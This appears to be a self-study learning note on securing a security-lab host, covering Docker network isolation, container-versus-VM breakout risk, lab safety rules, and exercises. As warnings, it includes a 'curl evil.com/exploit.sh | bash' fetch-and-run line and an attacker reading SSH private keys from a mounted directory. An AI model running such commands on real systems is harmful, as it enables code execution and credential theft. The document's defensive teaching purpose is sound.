# Module 0.1 — Host Workstation Safety & Virtualization Foundations

> **Session:** Session 1 (2026-06-29)
> **Roadmap ref:** `PHASE-0-SECURE-LAB.md` §8–9 (Modules 0.1 + 0.2)
> **Evidence:** `evidence/2026-06-29-session-1-docker-isolation.txt`
> **Session plan:** `session-plans/session-01-host-safety.md`

---

## Part 1: Why the Host Matters

### 1.1 The Core Problem

Imagine you're learning chemistry. You want to mix dangerous chemicals to see what happens — acids, bases, volatile compounds. You wouldn't do this on your kitchen table where your family eats. You'd use a fume hood with a glass shield, wearing gloves and goggles.

A **security lab** is the same idea, but for software.

You will run:
- **Exploit code** — software designed to break into systems
- **Vulnerable targets** — intentionally weak systems that are easy to compromise
- **Attack tools** — scanners, password crackers, packet sniffers

If any of these run directly on your real computer (the **host**), a mistake means: lost files, stolen credentials, compromised accounts.

The solution is **isolation**: run dangerous software in a sandbox (container or VM) so that even if it's compromised, your real machine is safe.

### 1.2 The Trust Model

Every security lab has a trust hierarchy:

```
YOUR LAPTOP (HOST) — MOST TRUSTED
│
├── Real data: passwords, crypto wallets, SSH keys, work documents
├── Real applications: browser, email, code editor
│
└── Virtualization layer (Docker, VirtualBox, QEMU)
    └── Lab guests (containers or VMs) — ASSUME COMPROMISED
```

**The fundamental rule:** Lab guests are untrusted. You design your lab assuming they *will* be compromised at some point. The host must be protected from the guests — not the other way around.

### 1.3 Your Actual Setup

```
Windows (REAL host)
  │
  └── WSL2 (Linux VM managed by Windows — where your terminal runs)
       │
       ├── /home/motafeq/projects/CyberSecEngineer/ (your repo)
       │
       └── Docker Desktop (containers run here)
            └── Lab containers — assume compromised
```

Why this matters: If a container is compromised, the attacker gets access to:
1. **WSL2 files** (your repo, SSH keys, project files) — if you mounted them into the container
2. **Windows files** (`C:\Users\motafeq\`) — ONLY if you also mounted `/mnt/c/` into the container
3. **Neither** — if you mount nothing and keep containers isolated

Your job as the lab architect: choose option 3 whenever possible.

### 1.4 Attack Vectors (What Can Go Wrong)

| Vector | How It Works | Real Example |
|---|---|---|
| **Shared folders** | A compromised container can read/write everything in a mounted host directory | You run `docker run -v ~/:/home/` and the attacker reads `~/.ssh/id_rsa` |
| **Shared clipboard** | Copy a password on the host, paste it in a compromised container — attacker sees it | Docker Desktop's clipboard sharing |
| **Same network** | Vulnerable target on the same network as your real machine | Attacker scans your host from inside a compromised container |
| **Exploit on host** | Accidentally running malicious code directly on your WSL2 terminal | You `curl https://evil.com/exploit.sh \| bash` instead of running it in a container |

### 1.5 Your System Inventory

Run these commands to know your lab environment:

```bash
# Operating system
cat /etc/os-release | head -3

# CPU model
lscpu | grep "Model name"

# Memory (total, used, free)
free -h | grep Mem

# Disk usage on root partition
df -h / | tail -1

# Kernel version (containers share this!)
uname -r

# Docker version
docker --version

# Docker server info
docker info | head -5
```

**Why this matters:**
- Kernel version tells you what kernel your containers will share — old kernels have known container-escape exploits
- Memory and disk tell you what lab targets you can run
- Docker version tells you what features are available

---

## Part 2: Virtualization Concepts

### 2.1 Containers vs Virtual Machines

This is the most important distinction in lab architecture.

| Aspect | Docker Container | Full Virtual Machine |
|---|---|---|
| **Kernel** | Shares the host's kernel (WSL2's Linux kernel) | Has its own kernel (e.g., Kali boots its own Linux kernel) |
| **Isolation mechanism** | Linux namespaces + cgroups (software isolation) | Hardware emulation (CPU, memory, devices are virtualized) |
| **Startup time** | Seconds | Minutes |
| **Size** | Megabytes | Gigabytes |
| **Operating systems** | Linux only (on Linux/WSL2) | Any OS: Linux, Windows, BSD |
| **Breakout risk** | Higher — same kernel, larger attack surface | Lower — separate kernel, smaller attack surface |
| **Available on WSL2?** | ✅ Yes (Docker Desktop) | ❌ No (no nested virtualization in WSL2) |

### 2.2 What Happens in a Breakout?

This is critical to understand because it determines your risk:

**Container breakout:**
```
Attacker compromises container
  → Escapes container's namespace isolation
  → Gains access to WSL2's Linux kernel
  → Can read WSL2 files, processes, network
  → BUT: still inside a VM (WSL2) managed by Windows
  → To reach Windows: needs a SECOND exploit (WSL2 → Windows escape)
```

**VM escape:**
```
Attacker compromises VM
  → Escapes the emulated hardware
  → Gains access to the hypervisor (VirtualBox, QEMU)
  → Hypervisor runs directly on Windows
  → Now has access to Windows host
```

**Bottom line:** Container breakouts are more common but less severe (you lose WSL2, not Windows). VM escapes are rare but catastrophic (attacker gets your whole machine).

### 2.3 Network Modes (How Isolation Works)

Four standard network modes exist. Choosing the right one is the difference between a safe lab and a compromised host.

| Mode | How It Works | Host can reach guest? | Guest can reach internet? | Guests can reach each other? | When to use |
|---|---|---|---|---|---|
| **NAT** | Guest shares host's IP. Host forwards traffic for the guest. | No (one-way) | Yes (via host) | No (by default) | Attack workstation that needs to download tools |
| **Host-only** | Virtual network adapter, no external connectivity. | Yes | **No** | Yes | **Vulnerable targets** — they should never reach the internet |
| **Bridged** | Guest appears as a separate device on the real network. | Yes (same subnet) | Yes (directly) | Yes | **NEVER for vulnerable targets** — they're exposed to your real LAN |
| **Internal** | Fully isolated virtual network, no host access either. | **No** | **No** | Yes | Maximum isolation — malware analysis |

For Docker specifically:
- **`--internal` flag** = host-only mode for containers (blocks outbound internet, containers can still talk to each other)
- **Default bridge (docker0)** = NAT mode (containers get internet via Docker's NAT)
- **User-defined bridge** = containers can resolve each other by name (DNS)

### 2.4 Why This Matters for Your Lab

```
Docker network layout for our lab:

┌──────────────────────────────────────────┐
│          lab-net-internal                 │
│  (--internal: no internet at all)        │
│                                          │
│  ┌──────────────┐    ┌──────────────┐   │
│  │  Kali attack  │    │ Vulnerable   │   │
│  │  (also has    │◄──►│   target     │   │
│  │   NAT net)    │    │ Metasploitable│  │
│  └──────┬───────┘    └──────────────┘   │
│         │                                │
└─────────┼────────────────────────────────┘
          │
          ▼
   Internet (via NAT network)
   — ONLY Kali can reach this
   — Target cannot reach internet at all
```

The vulnerable target has:
- **No path to the internet** — even if compromised, the attacker can't phone home
- **No path to your WSL2 host** — the host isn't on this network
- **Can only talk to Kali** — the attack machine on the same isolated network

---

## Part 3: Lab Directory Structure & Safety

### 3.1 Directory Layout

Your lab directory structure is also a security boundary. Keep it organized:

```
/home/motafeq/projects/CyberSecEngineer/
├── Roadmap/                    # Phase docs, reference (source of truth)
├── learning/                   # Your notes, evidence, session records
│   └── phases/phase-0-secure-lab/
│       ├── PLAN.md             # Phase plan with status tracking
│       ├── session-plans/      # Per-session plans (written before session)
│       ├── notes/              # Learning notes (written after session)
│       └── evidence/           # Raw command outputs, screenshots, logs
└── building/                   # Things you build
    ├── labs/                   # Lab configs, Dockerfiles, compose files
    │   ├── iso/                # Downloaded ISO images
    │   ├── configs/            # VM/container configuration files
    │   ├── compose/            # Docker Compose files
    │   └── HOST-SAFETY-CHECKLIST.md
    ├── capstones/              # Phase capstone deliverables
    ├── projects/               # Standalone tools and scripts
    ├── portfolio/              # Public-facing portfolio pieces
    └── threat-models/          # Cross-phase threat models
```

### 3.2 The Hard Rules

These are not guidelines. They are rules. Breaking any of them in a lab session means the session stops until the issue is fixed.

**Rule 1: NO real passwords, API keys, or secrets in ANY lab directory**
- Not in config files, not in environment variables, not in scripts
- Not even commented out ("just for testing")
- Lab credentials exist only inside the lab container, never on the host filesystem

**Rule 2: NO crypto wallet files, seed phrases, or private keys near lab code**
- Your Ethereum keys, Solana wallets, or any blockchain credentials
- If a container is compromised and your repo is mounted, those wallets are stolen

**Rule 3: NO production credentials in packet captures or logs**
- Packet captures may contain tokens, session cookies, or API keys in plain text
- If you must capture traffic that might contain secrets, redact before saving

**Rule 4: NO exploit code runs on the host — only in containers**
- The host (WSL2) is for editing code, writing notes, browsing documentation
- The container is for running exploits, scanning, attacking
- If you need to test something, do it in a container, not on your terminal

**Rule 5: Every vulnerable target stays in an isolated network**
- Vulnerable targets go on `--internal` networks (or host-only for VMs)
- No vulnerable target ever has internet access
- No vulnerable target is on the same network as your host

### 3.3 Safety Checklist (Before Every Session)

```markdown
## Before Every Lab Session
- [ ] No real credentials visible in shell history
- [ ] No crypto wallets or keys in lab directories
- [ ] Lab directory permissions are correct (750)
- [ ] Lab-only credentials used (not real ones)
- [ ] Docker is running and containers are clean

## During Lab Session
- [ ] Exploit code runs only inside containers
- [ ] Every container has a clear purpose (attack vs target vs utility)
- [ ] Vulnerable targets are on isolated (--internal) networks
- [ ] No shared folders between host and target containers

## After Every Session
- [ ] Containers stopped and cleaned up
- [ ] Evidence saved to `building/labs/evidence/`
- [ ] Notes written before starting the next session
```

### 3.4 Create Your Directories

```bash
mkdir -p /home/motafeq/projects/CyberSecEngineer/building/labs/{iso,configs,compose,evidence}
chmod 750 /home/motafeq/projects/CyberSecEngineer/building/labs
```

`chmod 750` means: owner can read/write/execute, group can read/execute, others get nothing. This prevents other WSL2 users (if any) from reading your lab files.

---

## Part 4: Docker Isolation — Hands-On

### 4.1 Why Docker for This Lab

Docker is the right tool here because:
1. **It's already running** (Docker Desktop on Windows, integrated with WSL2)
2. **No nested virtualization needed** — containers share WSL2's kernel
3. **Fast and scriptable** — spin up and tear down targets in seconds
4. **Network isolation is explicit** — `--internal` flag, custom bridges, DNS resolution

### 4.2 Creating Isolated Networks

Every lab session needs at least two Docker networks:
- **Internal network** — for vulnerable targets (no internet)
- **NAT network** — for the attack machine (needs internet for tool downloads)

```bash
docker network create --driver bridge --internal lab-net-internal
```

**Command breakdown:**

| Part | What it is | What it does |
|---|---|---|
| `docker` | CLI tool | Talks to the Docker daemon running in Docker Desktop |
| `network create` | Subcommand | Creates a new virtual network |
| `--driver bridge` | Flag | Creates a virtual Layer-2 switch. Containers on the same bridge can talk to each other. This is the default driver. |
| `--internal` | Flag | **The security-critical flag.** Blocks all outbound traffic. Containers on this network cannot reach the internet, the host, or any other Docker network. |
| `lab-net-internal` | Argument | The name. You'll use this name with `--network lab-net-internal` when starting containers. |

```bash
docker network create lab-net-nat
```

No `--internal` here. Containers on this network get internet access via Docker's built-in NAT (Network Address Translation). Docker's NAT works like a home router: containers can reach out to the internet, but the internet cannot initiate connections to them.

**Expected output for both:** A long hex string (the network ID). Example:
```
4128eab6f097278b93874508f19275111efdfaa051b766fd4bd47c9f793d505d
```

### 4.3 Testing Isolation (Verify What You Built)

**Test 1: Can a container on the internal network reach the internet?**

```bash
docker run --rm -it --network lab-net-internal alpine sh
```

| Part | What it does |
|---|---|
| `docker run` | Create and start a container |
| `--rm` | Delete the container automatically when it exits (no left over containers) |
| `-it` | Two flags combined: `-i` keeps stdin open (interactive), `-t` allocates a terminal. Together they give you an interactive shell. |
| `--network lab-net-internal` | Attach this container to the isolated network we created |
| `alpine` | The container image. Alpine Linux is a ~5MB distribution — minimal, fast to pull, perfect for quick tests. |
| `sh` | The command to run inside the container. `sh` is the Almquist shell, the default on Alpine. |

You'll see a `/ #` prompt — you're now inside the container.

```bash
/ # ping 8.8.8.8
```

| Part | What it does |
|---|---|
| `ping` | Sends ICMP Echo Request packets to test reachability |
| `8.8.8.8` | Google's public DNS server — a standard internet reachability test |

**Expected output:**
```
PING 8.8.8.8 (8.8.8.8): 56 data bytes
ping: sendto: Network unreachable
```

`Network unreachable` means the container has no route to the internet at all. The `--internal` flag is working. Press `Ctrl+C` to stop the ping, then `exit` to leave the container.

**Test 2: Can two containers on the same internal network talk to each other?**

First, start a background container with a hostname:
```bash
docker run --rm -d --name server1 --network lab-net-internal alpine sleep 300
```

| Part | What it does |
|---|---|
| `--rm` | Same — delete on exit |
| `-d` | **Detached mode.** Runs in the background. No terminal attached. |
| `--name server1` | Give the container a hostname. Docker DNS will resolve `server1` to this container's IP address. |
| `alpine sleep 300` | Run `sleep 300` (do nothing for 5 minutes). Keeps the container alive so we can ping it. |

Now open a second terminal tab (or a second command) and run:
```bash
docker run --rm -it --network lab-net-internal alpine sh
/ # ping server1
```

**Expected output:**
```
PING server1 (172.19.0.2): 56 data bytes
64 bytes from 172.19.0.2: seq=0 ttl=64 time=0.070 ms
64 bytes from 172.19.0.2: seq=1 ttl=64 time=0.055 ms
...
```

0% packet loss. Containers on the same user-defined bridge network can reach each other by name. Docker runs a built-in DNS server that resolves container names to IP addresses on this network.

Press `Ctrl+C` to stop, then `exit`.

### 4.4 Understanding What Happened

Docker networks are **isolated by default**. Containers on different bridge networks cannot communicate with each other at all, unless you explicitly connect them. This means:

```
Container A on lab-net-internal ──X── Container B on lab-net-nat
                                      (no route — different bridges)
```

The `--internal` flag adds one additional restriction: it blocks outbound traffic from the network entirely. A container on `lab-net-internal` can't even reach the internet, let alone other Docker networks.

### 4.5 Clean Up

```bash
docker stop server1
docker network rm lab-net-internal lab-net-nat
docker system prune -f    # Removes unused containers, networks, and images
```

---

## Part 5: Docker Command Reference

| Command | What it does | Breakdown |
|---|---|---|
| `docker network create --driver bridge --internal <name>` | Creates an isolated Docker network with no outbound internet | `--driver bridge` creates a virtual switch; `--internal` blocks all egress traffic |
| `docker run --rm -it --network <name> <image> <cmd>` | Runs an interactive container on a specific network | `--rm` auto-deletes on exit; `-it` gives you a terminal; `--network` attaches to named network |
| `docker run --rm -d --name <name> <image> <cmd>` | Runs a background container with a DNS hostname | `-d` detaches to background; `--name` sets the DNS name for container-to-container resolution |
| `docker network rm <name>` | Deletes a Docker network | Fails if containers are still attached |
| `docker system prune -f` | Removes all unused containers, networks, images, and build cache | `-f` skips the confirmation prompt |
| `docker ps` | Lists running containers | Add `-a` to show stopped containers too |

---

## Part 6: Common Mistakes

1. **Forgetting `--rm`:** Containers accumulate on disk. After 20 test containers, you'll have 20 stopped containers consuming disk space. Always use `--rm` for disposable test containers.

2. **Running exploit code on the host:** When you copy-paste a command from this document, make sure you're inside a container (your prompt shows `/ #`) and not on your WSL2 terminal.

3. **Mounting your entire home directory:** `docker run -v ~/:/home/` gives the container access to everything in your home. Mount only specific directories: `-v ~/project/target:/work`

4. **Assuming container breakout is rare:** It's not. Docker container breakouts are found regularly (CVE-2024-21626, CVE-2019-5736, etc.). Treat containers as a convenience isolation, not a security boundary.

5. **Forgetting WSL2's dual nature:** Files are shared between Windows and WSL2 via `/mnt/c/`. If you mount `/mnt/c/` into a container, you're exposing your entire Windows filesystem.

---

## Part 7: Self-Study Exercises

**Exercise 1:** Create two Docker networks — one with `--internal`, one without. Run a container on each. Try `ping 8.8.8.8` from both. What happens? Why?

**Exercise 2:** Start a container on `lab-net-internal` with `--name mysql-server`. Start another container on the SAME network. Can you `ping mysql-server`? What IP resolves? Now start a third container on `lab-net-nat` and try to `ping mysql-server` from it. What happens?

**Exercise 3:** Start a container WITHOUT `--rm`. Exit it. Run `docker ps -a`. You'll see the stopped container. Now run `docker rm <container-id>`. Understand why `--rm` saves you this step.

**Exercise 4:** Run `docker network ls` to list all networks. Notice there's a `bridge` (default), `host`, and `none` network pre-created by Docker. Look up what the `none` network does (hint: it's even more isolated than `--internal`).

---

## Part 8: Quiz Bank

These questions test understanding, not recall. Try answering without looking at the notes first.

**Question 1:** You run `docker run -v ~/:/host-home alpine sh`. Inside the container, an attacker runs `cat /host-home/.ssh/id_rsa`. What does the attacker get? Can they also read `C:\Users\motafeq\`?

<details>
<summary>Answer</summary>

The attacker gets your WSL2 SSH keys (`~/.ssh/id_rsa`). They CANNOT directly access `C:\Users\motafeq\` — that requires the Windows path `/mnt/c/Users/motafeq/` to be mounted. However, WSL2 has access to `/mnt/c/` by default, so if you also mounted `/mnt/c/` or if the attacker can break out of the container into WSL2 first, they could reach Windows files.
</details>

**Question 2:** What is the difference between a container breakout and a VM escape? Which is more likely? Which is more severe?

<details>
<summary>Answer</summary>

Container breakout escapes Linux namespace isolation and gains access to the WSL2 Linux kernel (same kernel, different namespace). VM escape breaks out of hardware emulation and gains access to the hypervisor (VirtualBox/QEMU) running on Windows.

Container breakouts are more common (larger attack surface, same kernel). VM escapes are more severe (attacker reaches the real Windows host, not just WSL2).
</details>

**Question 3:** You have containers A and B on `lab-net-internal` (with `--internal`). Container C is on `lab-net-nat` (NAT). Container A's attacker wants to reach the internet. List all the barriers they'd have to break through.

<details>
<summary>Answer</summary>

1. Cannot reach internet directly: `--internal` blocks outbound traffic at the Docker bridge level
2. Cannot reach Container C: different Docker networks are isolated by default — no route between them
3. Cannot reach the host (WSL2): the host isn't on either Docker network
4. To reach the internet, the attacker would need to: (a) break out of the container into WSL2, then (b) use WSL2's network stack to reach the internet
</details>

**Question 4:** Why is the `docker` group membership considered equivalent to root? What can a member of the `docker` group do?

<details>
<summary>Answer</summary>

The Docker daemon runs as root. The `docker` group is granted permission to communicate with the daemon socket (`/var/run/docker.sock`). A member of the `docker` group can:
- Run any container with any mounts (including mounting the entire host filesystem)
- Execute commands as root inside containers
- Access the host's network, processes, and devices through container mounts

`sudo usermod -aG docker $USER` gives you convenience (no `sudo` before every `docker` command) at the cost of security (any process running as your user can escalate to root via Docker).
</details>

---

## Appendix: Key Files Created in This Session

| File | Location | Purpose |
|---|---|---|
| Host safety checklist | `building/labs/HOST-SAFETY-CHECKLIST.md` | Rules to follow before/during/after every session |
| Learning note (this file) | `notes/01-host-safety.md` | Full educational document for this topic |
| Evidence | `evidence/2026-06-29-session-1-docker-isolation.txt` | Raw command outputs proving isolation works |
| Session record | `session-records/SESSION-003.md` | Log of what happened this session |

---

## What's Next

**Session 2 — Kali Attack Workstation & Vulnerable Targets:**
- Set up Kali Linux as your attack workstation in Docker
- Deploy a vulnerable target (Metasploitable or DVWA)
- Practice scanning and enumeration in the isolated network
- Verify the target has no path to the internet or the host
